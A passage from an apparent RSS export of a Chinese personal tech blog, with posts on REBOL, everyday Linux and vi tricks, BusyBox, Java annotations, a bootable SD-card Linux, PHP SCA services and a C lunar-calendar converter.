<![CDATA[<P>REBOL发音为“reb-ol”（类似“rebel with a cause”中的），代表“基于相关表达式的对象语言”（relative expression based object language）。他第一次发布是在1997年到目前为止已经下载超过四百万次。他对客户端和服务器端应用程序都是十分合适的</P>  <P>REBOL手册中文翻译：<A rel="nofollow" href="http://www.nirvanastudio.org/category/rebol"  >http://www.nirvanastudio.org/category/rebol</A></P>  <P>一个非常强大的GUI和网络编程软件，0.6M大小，从这里下载： <A rel="nofollow" href="http://www.rebol.com/view-platforms.html"  >http://www.rebol.com/view-platforms.html</A></P>  <P>REBOL in One Line（一行代码的程序）</P>  <P>REBOL一行代码程序有悠久的历史，这里有45个一行代码程序：</P>  <P><A rel="nofollow" href="http://www.rebol.com/oneliners.html"  >http://www.rebol.com/oneliners.html</A></P>  <P>例如： <FONT face="Courier New"  size="2" >print read http://www.rebol.com</FONT></P>  <P>REBOL的GUI程序：</P>  <P><A rel="nofollow" href="http://www.rebol.com/docs/view-guide.html#section-1"  >http://www.rebol.com/docs/view-guide.html#section-1</A></P>  <P>例如：view layout [title "Hello World!"]<BR></P>  <P>&nbsp;</P>  <P>&nbsp;</P>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>other</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084411190347/</guid>
    </item>
    <item>
      <title>
<![CDATA[几个好用的linux命令和vi操作:mtr,tee,ssh-copy-id,python -m]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/33731937201093124722423/</link>
      <description>
<![CDATA[1。查看网络连接状态用什么？<br>ping和traceroute都out了，超级牛力的是mtr，和top类似的界面，试一下吧<br>mtr www.google.com<br><br>2。使用vi打开一个文件，修改了一大片，要保存的时候发现没有修改权限，怎么办？最土的办法是，用鼠标保存到系统剪贴板，然后再重新用sudo打开，然后再粘贴进去；稍微先进一点的是:w newfile，然后再退出后sudo mv覆盖回去。现在这两个方法都out了。试下这个命令吧<br>:w !sudo tee %<br><br>3。玩儿过hadoop或者MPI的，都知道ssh-keygen -t rsa... scp... echo ... authorized_keys ...，一大堆命令之后，终于可以直接登录了，现在这些命令也out了，因为ssh-copy-id 出来了，试一下这个吧：<br>ssh-copy-id user@desthost<br><br>4。想给一个同学传文件怎么办？用飞鸽，用QQ，但是如果要给100个人呢？放邮箱里吗？已经out了，自己做个web服务器就可以啦，不用安装，只要有python运行环境。进入要共享的目录，然后运行这个<br>python -m SimpleHTTPServer<br>然后别人就可以通过 http://你的IP:8000/访问你的目录了。]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Admin</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/33731937201093124722423/</guid>
    </item>
    <item>
      <title>
<![CDATA[Ubuntu下学习busysbox]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720081026573349/</link>
      <description>
<![CDATA[1. 获取源代码<br>cd /usr/local/src<br>sudo apt-get source busybox<br>可爱的apt-get，分别从网上下载了1.1.3 1.8.0 1.9.0 ...，都不能用，原来都需要打补丁，实际上这个apt-get下来的1.10.2的版本包括1.10.2的源代码，补丁包，描述文件和打过补丁的源代码目录<br>2. 编译<br>sudo chown -R hankjin busybox-1.10.2<br>cd busybox-1.10.2<br>make defconfig<br>make<br>./busybox ls<br>3. 加入自己的命令<br>3.1 源代码miscutils/hjzcmd.c<br>#include "busybox.h"<br>int hjzcmd(int argc, char *argv[])<br>{<br>&nbsp;&nbsp;&nbsp; printf("Hello, hjz cmd called\n");<br>&nbsp; &nbsp; return 0;<br>}<br>3.2 miscutils/Kbuid (源代码对应编译选) <br>lib-$(CONFIG_HJZCMD)&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; += hjzcmd.o<br>3.3 miscutils/Config.in (编译选项menuconfig菜单)<br>config HJZCMD<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bool "hjzcmd"<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; default n<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; help<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; hankjin's command, do nothing, just print ok<br>3.4 include/appets.h (hjzcmd的命令存放位置)<br>USE_HJZCMD(APPLET(hjzcmd, _BB_DIR_USR_BIN, _BB_SUID_NEVER))<br>3.5 include/usage.h（用法说明，帮助命令中显示)<br>#define hjzcmd_trivial_usage&nbsp;&nbsp;&nbsp; "None"<br>#define hjzcmd_full_usage&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "None"<br>3.6 测试<br>make<br>./busybox hjzcmd<br>make install<br>ls _install/usr/bin|grep hjzcmd<br><br><br><br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720081026573349/</guid>
    </item>
    <item>
      <title>
<![CDATA[JDK5 新特性 Annotation]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720085145145930/</link>
      <description>
<![CDATA[参考JDK源代码java.lang.annotation<br>限制不同的类的访问权限<br><br>package hjz.annotation;<br><br>import java.lang.annotation.Documented;<br>import java.lang.annotation.ElementType;<br>import java.lang.annotation.Retention;<br>import java.lang.annotation.RetentionPolicy;<br>import java.lang.annotation.Target;<br><br>@Documented<br>@Retention(RetentionPolicy.RUNTIME)<br>@Target(ElementType.TYPE)<br>@interface Access{<br>&nbsp;&nbsp; &nbsp;String name();<br>&nbsp;&nbsp; &nbsp;String pass();<br>}<br>abstract class User{}<br><br>@Access(name="hank",pass="123")<br>class Student extends User{<br>&nbsp;&nbsp; &nbsp;public Student(){}<br>}<br>class Teacher extends User{<br>&nbsp;&nbsp; &nbsp;<br>}<br>public class Test {<br><br>&nbsp;&nbsp; &nbsp;/**<br>&nbsp;&nbsp; &nbsp; * @param args<br>&nbsp;&nbsp; &nbsp; */<br>&nbsp;&nbsp; &nbsp;public static void main(String[] args) {<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;// TODO Auto-generated method stub<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("can Student say Hi?" + new Test().sayHi(new Student()));<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;System.out.println("can Teacher say Hi?" + new Test().sayHi(new Teacher()));<br>&nbsp;&nbsp; &nbsp;}<br>&nbsp;&nbsp; &nbsp;boolean sayHi(User user){<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(user.getClass().isAnnotationPresent(Access.class) == false)<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;Access access = user.getClass().getAnnotation(Access.class);<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;if(access.name().equals("hank") &amp;&amp; access.pass().equals("123"))<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return true;<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;else<br>&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; &nbsp;return false;<br>&nbsp;&nbsp; &nbsp;}<br>}]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>J2SE</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720085145145930/</guid>
    </item>
    <item>
      <title>
<![CDATA[制作从U盘(SD卡)启动的Linux CDLinux 0.4.9]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372008931103556676/</link>
      <description>
<![CDATA[买手机送了一个读卡器，刚好把闲置的32M佳能SD卡利用起来，虽然支持U盘启动的Linux很多，但一般都很大，最后试验成功的只有两种<br>1. 自编译的嵌入式Linux<br>全部用源代码编译成，使用busybox编译的文件系统，最后只用了几兆的空间，可惜因为用的busybox，扩展很不方便。<br>2. CDLinux 0.4.9<br>实际上最新的CDLinux已经很强大了，0.5.1和0.6.1已经支持桌面了，可惜对于32M的SD卡来讲，桌面太奢侈了，最终选择0.4.9的CDLinux，不带桌面，不过提供了cce中文输入法，很好很强大<br>安装方法：<br><div>

    










<ol><li>首先将SD卡格式化为可启动U盘，并改为syslinux引导
<ol><li>在Windows下，使用Dropbox:/bin/LiveUSB的FlashBootWizard将SD卡格式化为可启动FreeDOS盘，并使用USB-ZIP模式启动，测试可以进入FreeDOS
</li><li>进入Linux下执行命令：syslinux /dev/sda
</li></ol></li><li>拷贝文件到SD卡
<ol><li>挂载文件(SD卡被识别为/dev/sda)
<ol><li>mkdir /mnt/img
</li><li>mount -o loop CDlinux-0.4.9.iso /mnt/cdrom
</li><li>mount -o loop /mnt/cdrom/boot/CDlinux/CDlinux.img /mnt/img
</li><li>mount /dev/sda /mnt/win
</li></ol></li><li>拷贝kernel和ramdisk
<ol><li>cp /mnt/img/bzImage      /mnt/win
</li><li>cp /mnt/img/CDlinux.gz   /mnt/win
</li></ol></li><li>拷贝syslinux的配置文件
<ol><li>cp /mnt/img/SYSlinux.cfg /mnt/win
</li></ol></li><li>拷贝软件包
<ol><li>mkdir /mnt/win/CDlinux
</li><li>cp -r /mnt/cdrom/boot/CDlinux/extra   /mnt/win/CDlinux
</li></ol></li><li>拷贝完成后应该有4个文件(ldlinux.sys,syslinux.cfg,bzImage,CDlinux.gz)和一个文件夹(CDlinux)
</li><li>ldlinux.sys (syslinux boodloeader的第二阶段引导代码）</li><li>syslinux.cfg (syslinux的引导配置文件)</li><li>bzImage 内核</li><li>CDlinux.gz initrd文件压缩的<br></li></ol></li><li>修改启动参数
<ol><li>启动时输入cdlinux CDL_DEV=/dev/sda
</li><li>或者修改syslinux.cfg 在CDlinux.gz后加入CDL_DEV=/dev/sda
</li></ol></li></ol>






        
  </div>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Unix</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/337319372008931103556676/</guid>
    </item>
    <item>
      <title>
<![CDATA[在PHP中使用SCA]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/3373193720084222632526/</link>
      <description>
<![CDATA[首先，安装WAMPServer2.0c(http://www.wampserver.com/en/download.php)，<br>然后下载SCA(http://pecl.php.net/package/SCA_SDO),把其中的SCA文件夹解压缩<br>然后，启动WAMP，修改php.ini，增加extension=php_sdo.dll 增加include_path=".;&lt;SCA路径&gt;" 例如<br>include_path=".;D:\programe\wamp\bin\php\php5.2.6\includes" <br>最后重启Apache即可<br>参考文档: http://www.osoa.org/display/PHP/SCA+Documentation<br>第一个例子(hi.php)，可以通过浏览器访问(http://localhost/hjz/hi.php?wsdl)：<br><span style="color: rgb(255, 0, 0);">注意&lt;?php 这里的php不能省略，class名字要和文件名一致(大小写可以不一致)</span><br>&lt;?php<br>include "SCA/SCA.php";<br>/**<br>&nbsp;* @service<br>&nbsp;* @binding.soap<br>&nbsp;*/<br>class hi {<br>&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp; &nbsp;* @param string $user username<br>&nbsp;&nbsp;&nbsp; &nbsp;* @return string<br>&nbsp;&nbsp;&nbsp; &nbsp;*/<br>&nbsp;&nbsp;&nbsp; function sayHi($user){<br>&nbsp;&nbsp;&nbsp; &nbsp;&nbsp;&nbsp; return "Hello, ".$user;<br>&nbsp;&nbsp;&nbsp; }<br>}<br>?&gt;<br>第一个例子客户端(sayhi.php)：<br>&lt;?php<br>include "SCA/SCA.php";<br>$user = "hank";<br>print "User:".$user."&lt;BR&gt;";<br><br>$hiService = SCA::getService('hi.php');<br>$resp = $hiService-&gt;sayHi($user);<br>echo "Response:".$resp;<br>?&gt;<br>第二个例子：(ibm.php和hp.php分别提供两个service, hjz.php通过调用这两个service而实现一个service，hjzc.php调用hjz.php)<br>ibm.php<br>&lt;?php<br>include "SCA/SCA.php";<br><br>/**<br>&nbsp;* IBM's stock<br>&nbsp;* @service<br>&nbsp;* @binding.soap<br>&nbsp;*/<br>class IBM{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @return float<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function getQuote(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 300;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}<br>?&gt;<br>hp.php<br>&lt;?php<br>include "SCA/SCA.php";<br><br>/**<br>&nbsp;* HP's stock<br>&nbsp;* @service<br>&nbsp;* @binding.soap<br>&nbsp;*/<br>class HP{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @return float<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function getQuote(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return 200;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}<br>?&gt;<br>hjz.php<br>&lt;?php<br>include "SCA/SCA.php";<br><br>/**<br>&nbsp;* IBM/HP 's stock<br>&nbsp;* @service<br>&nbsp;* @binding.soap<br>&nbsp;*/<br>class HJZ{<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @reference<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @binding.php ibm.php<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public $ibm;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @reference<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @binding.soap hp.wsdl<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; public $hp;<br><br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /**<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; * @return float<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; */<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; function getQuote(){<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $ibmQuote = $this-&gt;ibm-&gt;getQuote();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; $hpQuote = $this-&gt;hp-&gt;getQuote();<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; return $ibmQuote / $hpQuote;<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<br>}<br>?&gt;<br>hjzc.php<br>&lt;?php<br>include "SCA/SCA.php";<br><br>$hjzService = SCA::getService("hjz.php");<br>$stock = $hjzService-&gt;getQuote();<br>echo $stock;<br>?&gt;<br><br>]]>      </description>
      <author>
<![CDATA[hankjin]]>      </author>
      <category>Web Skills</category>
      <guid isPermaLink="true">http://hankjin.blog.163.com/blog/static/3373193720084222632526/</guid>
    </item>
    <item>
      <title>
<![CDATA[农历和阳历相互转换-C语言]]>      </title>
      <link>http://hankjin.blog.163.com/blog/static/337319372009111004626247/</link>
      <description>
<![CDATA[<P>参考 <A rel="nofollow" href="http://blog.chinaunix.net/u/25381/showart_199996.html#include"  >http://blog.chinaunix.net/u/25381/showart_199996.html#include</A> </P>  <P>&lt;stdio.h&gt;<BR>#include &lt;string.h&gt;</P>  <P>typedef struct _hjz{<BR>&nbsp;&nbsp;&nbsp; int year;<BR>&nbsp;&nbsp;&nbsp; int month;<BR>&nbsp;&nbsp;&nbsp; int day;<BR>&nbsp;&nbsp;&nbsp; int reserved;<BR>} hjz;<BR>unsigned int lunar200y[199] = {<BR>&nbsp;&nbsp;&nbsp; 0x04AE53,0x0A5748,0x5526BD,0x0D2650,0x0D9544,0x46AAB9,0x056A4D,0x09AD42,0x24AEB6,0x04AE4A,/*1901-1910*/<BR>&nbsp;&nbsp;&nbsp; 0x6A4DBE,0x0A4D52,0x0D2546,0x5D52BA,0x0B544E,0x0D6A43,0x296D37,0x095B4B,0x749BC1,0x049754,/*1911-1920*/<BR>&nbsp;&nbsp;&nbsp; 0x0A4B48,0x5B25BC,0x06A550,0x06D445,0x4ADAB8,0x02B64D,0x095742,0x2497B7,0x04974A,0x664B3E,/*1921-1930*/<BR>&nbsp;&nbsp;&nbsp; 0x0D4A51,0x0EA546,0x56D4BA,0x05AD4E,0x02B644,0x393738,0x092E4B,0x7C96BF,0x0C9553,0x0D4A48,/*1931-1940*/&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; 0x6DA53B,0x0B554F,0x056A45,0x4AADB9,0x025D4D,0x092D42,0x2C95B6,0x0A954A,0x7B4ABD,0x06CA51,/*1941-1950*/<BR>&nbsp;&nbsp;&nbsp; 0x0B5546,0x555ABB,0x04DA4E,0x0A5B43,0x352BB8,0x052B4C,0x8A953F,0x0E9552,0x06AA48,0x6AD53C,/*1951-1960*/<BR>&nbsp;&nbsp;&nbsp; 0x0AB54F,0x04B645,0x4A5739,0x0A574D,0x052642,0x3E9335,0x0D9549,0x75AABE,0x056A51,0x096D46,/*1961-1970*/<BR>&nbsp;&nbsp;&nbsp; 0x54AEBB,0x04AD4F,0x0A4D43,0x4D26B7,0x0D254B,0x8D52BF,0x0B5452,0x0B6A47,0x696D3C,0x095B50,/*1971-1980*/<BR>&nbsp;&nbsp;&nbsp; 0x049B45,0x4A4BB9,0x0A4B4D,0xAB25C2,0x06A554,0x06D449,0x6ADA3D,0x0AB651,0x093746,0x5497BB,/*1981-1990*/<BR>&nbsp;&nbsp;&nbsp; 0x04974F,0x064B44,0x36A537,0x0EA54A,0x86B2BF,0x05AC53,0x0AB647,0x5936BC,0x092E50,0x0C9645,/*1991-2000*/<BR>&nbsp;&nbsp;&nbsp; 0x4D4AB8,0x0D4A4C,0x0DA541,0x25AAB6,0x056A49,0x7AADBD,0x025D52,0x092D47,0x5C95BA,0x0A954E,/*2001-2010*/<BR>&nbsp;&nbsp;&nbsp; 0x0B4A43,0x4B5537,0x0AD54A,0x955ABF,0x04BA53,0x0A5B48,0x652BBC,0x052B50,0x0A9345,0x474AB9,/*2011-2020*/<BR>&nbsp;&nbsp;&nbsp; 0x06AA4C,0x0AD541,0x24DAB6,0x04B64A,0x69573D,0x0A4E51,0x0D2646,0x5E933A,0x0D534D,0x05AA43,/*2021-2030*/<BR>&nbsp;&nbsp;&nbsp; 0x36B537,0x096D4B,0xB4AEBF,0x04AD53,0x0A4D48,0x6D25BC,0x0D254F,0x0D5244,0x5DAA38,0x0B5A4C,/*2031-2040*/<BR>&nbsp;&nbsp;&nbsp; 0x056D41,0x24ADB6,0x049B4A,0x7A4BBE,0x0A4B51,0x0AA546,0x5B52BA,0x06D24E,0x0ADA42,0x355B37,/*2041-2050*/<BR>&nbsp;&nbsp;&nbsp; 0x09374B,0x8497C1,0x049753,0x064B48,0x66A53C,0x0EA54F,0x06B244,0x4AB638,0x0AAE4C,0x092E42,/*2051-2060*/<BR>&nbsp;&nbsp;&nbsp; 0x3C9735,0x0C9649,0x7D4ABD,0x0D4A51,0x0DA545,0x55AABA,0x056A4E,0x0A6D43,0x452EB7,0x052D4B,/*2061-2070*/<BR>&nbsp;&nbsp;&nbsp; 0x8A95BF,0x0A9553,0x0B4A47,0x6B553B,0x0AD54F,0x055A45,0x4A5D38,0x0A5B4C,0x052B42,0x3A93B6,/*2071-2080*/<BR>&nbsp;&nbsp;&nbsp; 0x069349,0x7729BD,0x06AA51,0x0AD546,0x54DABA,0x04B64E,0x0A5743,0x452738,0x0D264A,0x8E933E,/*2081-2090*/<BR>&nbsp;&nbsp;&nbsp; 0x0D5252,0x0DAA47,0x66B53B,0x056D4F,0x04AE45,0x4A4EB9,0x0A4D4C,0x0D1541,0x2D92B5&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; /*2091-2099*/<BR>};</P>  <P>int monthTotal[13] = {0,31,59,90,120,151,181,212,243,273,304,334,365};<BR>hjz toSolar(hjz lunar){<BR>&nbsp;&nbsp;&nbsp; int year = lunar.year,<BR>&nbsp;month = lunar.month,<BR>&nbsp;day = lunar.day;<BR>&nbsp;&nbsp;&nbsp; int byNow, xMonth, i;<BR>&nbsp;&nbsp;&nbsp; hjz solar;<BR>&nbsp;&nbsp;&nbsp; byNow = (lunar200y[year-1901] &amp; 0x001F) - 1;<BR>&nbsp;&nbsp;&nbsp; if( ((lunar200y[year-1901]&amp;0x0060)&gt;&gt;5) == 2)<BR>&nbsp;byNow += 31;<BR>&nbsp;&nbsp;&nbsp; for(i = 1; i &lt; month; i ++){<BR>&nbsp;if( ( lunar200y[year - 1901] &amp; (0x80000 &gt;&gt; (i-1)) ) ==0){<BR>&nbsp;&nbsp;&nbsp;&nbsp; byNow += 29;<BR>&nbsp;}<BR>&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp; byNow += 30;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; byNow += day;<BR>&nbsp;&nbsp;&nbsp; xMonth = (lunar200y[year - 1901] &amp; 0xf00000)&gt;&gt;20;<BR>&nbsp;&nbsp;&nbsp; if(xMonth != 0){<BR>&nbsp;if(month &gt; xMonth<BR>&nbsp;&nbsp;&nbsp;&nbsp; ||(month==xMonth &amp;&amp; lunar.reserved == 1)){<BR>&nbsp;&nbsp;&nbsp;&nbsp; if((lunar200y[year-1901] &amp; (0x80000&gt;&gt;(month-1)))==0)<BR>&nbsp;&nbsp;byNow += 29;<BR>&nbsp;&nbsp;&nbsp;&nbsp; else <BR>&nbsp;&nbsp;byNow += 30;<BR>&nbsp;}<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; if(byNow &gt; 366<BR>&nbsp;&nbsp;&nbsp;&nbsp; ||(year%4!=0 &amp;&amp; byNow == 365)){<BR>&nbsp;year += 1;<BR>&nbsp;if(year%4==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp; byNow -= 366;<BR>&nbsp;else<BR>&nbsp;&nbsp;&nbsp;&nbsp; byNow -= 365;<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; for(i=1; i &lt;= 13; i ++){<BR>&nbsp;if(monthTotal[i] &gt;= byNow){<BR>&nbsp;&nbsp;&nbsp;&nbsp; month = i;<BR>&nbsp;&nbsp;&nbsp;&nbsp; break;<BR>&nbsp;}<BR>&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp; solar.day = byNow - monthTotal[month-1];<BR>&nbsp;&nbsp;&nbsp; solar.month = month;<BR>&nbsp;&nbsp;&nbsp; solar.year = year;</P>  <P>&nbsp;&nbsp;&nbsp; return solar;<BR>}<BR>hjz toLunar(hjz solar){<BR>&nbsp;&nbsp;&nbsp; int year = solar.year,<BR>&nbsp;month = solar.month,<BR>&nbsp;day = solar.day;<BR>&nbsp;&nbsp;&nbsp; int bySpring,bySolar,daysPerMonth;<BR>&nbsp;&nbsp;&nbsp; int index,flag;<BR>&nbsp;&nbsp;&nbsp; hjz lunar;</P>  <P>&nbsp;&nbsp;&nbsp; //bySpring 记录春节离当年元旦的天数。<BR>&nbsp;&nbsp;&nbsp; //bySolar 记录阳历日离当年元旦的天数。<BR>&nbsp;&nbsp;&nbsp; if( ((lunar200y[year-1901] &amp; 0x0060) &gt;&gt; 5) == 1)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySpring = (lunar200y[year-1901] &amp; 0x001F) - 1;<BR>&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySpring = (lunar200y[year-1901] &amp; 0x001F) - 1 + 31;<BR>&nbsp;&nbsp;&nbsp; bySolar = monthTotal[month-1] + day - 1;<BR>&nbsp;&nbsp;&nbsp; if( (!(year % 4)) &amp;&amp; (month &gt; 2))<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySolar++;<BR>&nbsp;&nbsp; <BR>&nbsp;&nbsp;&nbsp; //daysPerMonth记录大小月的天数 29 或30<BR>&nbsp;&nbsp;&nbsp; //index 记录从哪个月开始来计算。<BR>&nbsp;&nbsp;&nbsp; //flag 是用来对闰月的特殊处理。</P>  <P>&nbsp;&nbsp;&nbsp; //判断阳历日在春节前还是春节后<BR>&nbsp;&nbsp;&nbsp; if (bySolar &gt;= bySpring) {//阳历日在春节后（含春节那天）<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySolar -= bySpring;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; month = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index = 1;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flag = 0;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( ( lunar200y[year - 1901] &amp; (0x80000 &gt;&gt; (index-1)) ) ==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 29;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth = 30;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; while(bySolar &gt;= daysPerMonth) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; bySolar -= daysPerMonth;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; index++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(month == ((lunar200y[year - 1901] &amp; 0xF00000) &gt;&gt; 20) ) {<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; flag = ~flag;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if(flag == 0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; month++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; }<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; else<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; month++;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; if( ( lunar200y[year - 1901] &amp; (0x80000 &gt;&gt; (index-1)) ) ==0)<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; daysPerMonth=29;<BR>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 